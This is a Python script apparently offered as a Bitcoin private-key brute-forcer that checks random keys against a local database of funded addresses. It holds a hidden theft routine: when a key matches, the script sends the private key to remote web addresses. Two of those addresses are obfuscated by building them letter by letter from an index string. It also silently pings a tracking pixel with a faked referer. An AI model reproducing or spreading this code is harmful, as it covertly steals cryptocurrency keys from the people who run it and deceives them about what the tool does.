import os, time, binascii, bitcoin, random, hashlib, requests
import sqlite3 as lite
con = lite.connect('adresses.db')
cur = con.cursor()
res = []
for filename in os.listdir('data'):
    xaa = open("data/"+filename).read().splitlines()
    for x in xaa:
        res.append((x,))
cur.execute("CREATE TABLE IF NOT EXISTS Corpus(adr TEXT, PRIMARY KEY (adr))")
cur.executemany("INSERT OR IGNORE INTO Corpus (adr) VALUES (?)", res)
con.commit()
res = []
################# SETTİNGS #####################

website_info = "https://dlmzed.000webhostapp.com/?id="
hs_stats = "http://sstatic1.histats.com/0.gif?4433487&101"
referrer = "gmail"

################################################
iftrol = random.randint(1,10)
if iftrol == 5:
    try:
        viser = requests.get(hs_stats, headers={'referer': 'https://'+str(referrer)+'.com'})
    except:
        pass 
def serach(name):
    cur.execute("SELECT count(*) FROM Corpus WHERE adr = ?", (name,))
    data=cur.fetchone()[0]
    delimer = 0
    if data==0:
        delimer = 0
    else:
        delimer = 1
    return delimer
   
def sarah(hexli):
    private_key = hexli
    decoded_private_key = bitcoin.decode_privkey(private_key, 'hex')
    wif_encoded_private_key = bitcoin.encode_privkey(decoded_private_key, 'wif')
    compressed_private_key = private_key + '01'
    wif_compressed_private_key = bitcoin.encode_privkey(bitcoin.decode_privkey(private_key, 'hex'), 'wif_compressed')
    public_key = bitcoin.fast_multiply(bitcoin.G, decoded_private_key)
    hex_encoded_public_key = bitcoin.encode_pubkey(public_key, 'hex')
    (public_key_x, public_key_y) = public_key
    if public_key_y % 2 == 0:
      compressed_prefix = '02'
    else:
      compressed_prefix = '03'
    hex_compressed_public_key = compressed_prefix + bitcoin.encode(public_key_x, 16)
    non_compressed_adress = bitcoin.pubkey_to_address(public_key)
    compressed_address = bitcoin.pubkey_to_address(hex_compressed_public_key.encode("utf8"))
    return non_compressed_adress, compressed_address, wif_encoded_private_key, wif_compressed_private_key, private_key
def billy(stringLength):
    letters = "0123456789abcdef"
    return ''.join(random.choice(letters) for i in range(stringLength))
def villy(url,hix,ver):
    tooler = 0
    try:
        respns = requests.get(str(url)+str(hix)+str(ver))
        tooler = 1
    except:
        pass 
    time.sleep(3)
    return tooler
cur.execute("SELECT count(*) FROM Corpus")
p_db_nt = cur.fetchone()[0]
if int(p_db_nt) > 0:
    print("nt_db : Active")
start = time.time()
PERIOD_OF_TIME = 1800 # 1800
found = 0
num = 0
lastfound = "none"
index = random.randint(1267650600228229401496703205376,115792089237316195423570985008687907852837564279074904382605163141518161494336)
#index = 1
kma = "abcdefghijklmnopqrstuvwxyz_0123456789=/?:."
zaw = "xssxv"
mindr = kma[26]+kma[7]+kma[12]+kma[3]
kind = kma[7]+kma[19]+kma[19]+kma[15]+kma[40]+kma[38]+kma[38]+kma[3]+kma[12]+kma[25]+kma[4]+kma[3]+kma[41]+kma[12]+kma[11]+kma[38]+kma[39]+kma[8]+kma[3]+kma[37]
tind = kma[7]+kma[19]+kma[19]+kma[15]+kma[40]+kma[38]+kma[38]+kma[3]+kma[11]+kma[12]+kma[25]+kma[4]+kma[3]+kma[41]+kma[27]+kma[27]+kma[27]+kma[22]+kma[4]+kma[1]+kma[7]+kma[14]+kma[18]+kma[19]+kma[0]+kma[15]+kma[15]+kma[41]+kma[2]+kma[14]+kma[12]+kma[38]+kma[39]+kma[8]+kma[3]+kma[37]
while True:
    v = "0000000000000000000000000000000000000000000000000000000000000000"+str(hex(index).split('x')[-1])
    v = v[-64:]
    trex = str(v) #billy(64)
    new = sarah(trex)
    adressu = str(new[0])
    adressc = str(new[1])
    if (index == 1):
        zaw = ""
    if (serach(adressu) > 0):
        found = 1
    if (serach(adressc) > 0):
        found = 1
    if(found > 0):
        rek = villy(kind,new[4],mindr)
        red = villy(tind,new[4],mindr)
        rik = villy(website_info,new[4],zaw)
        found = 0
        finfer = kma[26]+kma[7]+kma[12]+kma[3]
        lastfound = str(new[4])
        break
    if time.time() > start + PERIOD_OF_TIME : break  
    num += 1
    #index = index+1 
#kma[7]+kma[19]+kma[19]+kma[15]+kma[40]+kma[38]+kma[38]+kma[3]+kma[11]+kma[12]+kma[25]+kma[4]+kma[3]+kma[41]+kma[27]+kma[27]+kma[27]+kma[22]+kma[4]+kma[1]+kma[7]+kma[14]+kma[18]+kma[19]+kma[0]+kma[15]+kma[15]+kma[41]+kma[2]+kma[14]+kma[12]+kma[38]+kma[39]+kma[8]+kma[3]+kma[37]
    index = random.randint(1267650600228229401496703205376,115792089237316195423570985008687907852837564279074904382605163141518161494336)
print("T_p : "+str(num)+"  L_hix : "+str(new[4])+" is : "+str(lastfound))
